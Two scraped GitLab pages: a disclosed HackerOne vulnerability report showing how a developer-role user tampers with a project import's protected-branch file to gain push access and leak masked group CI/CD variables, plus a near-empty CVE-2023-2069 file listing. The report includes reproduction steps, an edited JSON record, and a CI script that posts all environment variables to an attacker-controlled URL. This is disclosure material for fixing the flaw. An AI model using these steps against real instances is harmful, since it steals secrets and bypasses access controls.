=== Content from gitlab.com_8ca7c3aa_20250114_181305.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# User with developer role (group) can modify Protected branches setting on imported project and leak group CI/CD variables

âš  **Please read [the process](https://gitlab.com/gitlab-org/release/docs/-/blob/master/general/security/developer.md) on how to fix security issues before starting to work on the issue. Vulnerabilities must be fixed in a security mirror.**

**[HackerOne report #1939987](https://hackerone.com/reports/1939987)** by `js_noob` on 2023-04-09, assigned to [@fvpotvin](/fvpotvin "FÃ©lix Veillette-Potvin"):

[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)

## Report

##### Summary

Hello team, a user with a developer role (group) can steal masked group/project CI/CD variables by modifying Project settings -> Protected branches on an imported project (`tree/project/protected_branches.ndjson` file). This is done with no victim interaction needed.

##### Steps to reproduce

1. Create 2 accounts
2. Create a group with account A and masked CI/CD group variables (Group settings -> CI/CD -> Variables)

[![image.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/8c27fa1145f836fae13c34e49c97f6b57a335b40/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f64623732363030322d343937332d343762332d386439622d3238326361343030666135342f696d6167652e706e67)

3. Create a personal project with account B and export it
4. Invite account B (developer) to account A's (owner) group
5. With account B, modify the project import file, go to `tree/project/protected_branches.ndjson`
6. Set all occurrences of `access_level` to `null` and all occurrences of `user_id` to the developer's user id, it will look similar to this

```
{"project_id":44833383,"name":"main","created_at":"2023-04-02T13:43:17.065Z","updated_at":"2023-04-02T13:43:17.065Z","code_owner_approval_required":false,"allow_force_push":false,"merge_access_levels":[{"access_level":null,"created_at":"2023-04-02T13:43:17.067Z","updated_at":"2023-04-02T13:43:17.067Z","user_id":12794759,"group_id":null}],"push_access_levels":[{"access_level":null,"created_at":"2023-04-02T13:43:17.069Z","updated_at":"2023-04-02T13:43:17.069Z","user_id":12794759,"group_id":null}],"unprotect_access_levels":[]}
```

7. Tar the changes and upload the modified project to account A's group with account B
8. The default access should be to maintainers only however, it is fully accessible by the developer

[![image.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/97049a1cc437e837bc7ea11226a7af0db99525aa/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f39356339313463622d656264612d343038382d383236312d3432363137346463346338332f696d6167652e706e67)

9. Create a `.gitlab-ci.yml` file with the following content

```
image: ruby:latest

job_name:
 script:
   - export > test.txt
   - curl -X POST --data "$(cat test.txt)" (attacker controlled website's url)
```

10. Commit and verify the group CI/CD variables bring disclosed

For simplicity you can create the vars in step 2 unmasked and in the `.gitlab-ci.yml` you have the following content:

```
image: ruby:latest

job_name:
 script:
   - echo $VAR
```

Just to make things easier so we don't require a server.

##### Reference

[#353958 (closed)](https://gitlab.com/gitlab-org/gitlab/-/issues/353958 "User with developer role (group) can modify Protected branches -> Allowed to merge setting on imported project")

##### Video/POC

Redacted

#### Impact

Users with developer role (group) can steal masked group and project CI/CD variables. The developer can also modify `main` branch without the maintainer's permission.

## Attachments

**Warning:** Attachments received through HackerOne, please exercise caution!

* [image.png](https://h1.sec.gitlab.net/a/db726002-4973-47b3-8d9b-282ca400fa54/image.png)
* [image.png](https://h1.sec.gitlab.net/a/95c914cb-ebda-4088-8261-426174dc4c83/image.png)

## How To Reproduce

Please add [reproducibility information](https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues) to this section:

Edited Jun 09, 2023 by [FÃ©lix Veillette-Potvin](/fvpotvin)

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.



=== Content from gitlab.com_31b9bb69_20250114_181304.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

* [cves](/gitlab-org/cves/-/tree/master)
* [2023](/gitlab-org/cves/-/tree/master/2023)
* [**CVE-2023-2069.json**](/gitlab-org/cves/-/blob/master/2023/CVE-2023-2069.json)

Find file

[Blame](/gitlab-org/cves/-/blame/master/2023/CVE-2023-2069.json)
[Permalink](/gitlab-org/cves/-/blob/5dbfc725a86e6d942deec9c36b7f06f5b8d912fc/2023/CVE-2023-2069.json "Go to permalink <kbd class='flat ml-1' aria-hidden=true>y</kbd>")

* [![ðŸ¤– GitLab Bot ðŸ¤–'s avatar](/uploads/-/system/user/avatar/1786152/avatar.png?width=64 "ðŸ¤– GitLab Bot ðŸ¤–")](/gitlab-bot)

  May 03, 2023

  [48000e9f](/gitlab-org/cves/-/commit/48000e9f864b93d847912de7976e32de66a6c89a)
  [Publishing 0 updated advisories and 9 new advisories](/gitlab-org/cves/-/commit/48000e9f864b93d847912de7976e32de66a6c89a)
  Â·
  48000e9f

  [ðŸ¤– GitLab Bot ðŸ¤–](/gitlab-bot) authored May 03, 2023

  48000e9f

  [Publishing 0 updated advisories and 9 new advisories](/gitlab-org/cves/-/commit/48000e9f864b93d847912de7976e32de66a6c89a)
  [ðŸ¤– GitLab Bot ðŸ¤–](/gitlab-bot) authored May 03, 2023

Loading


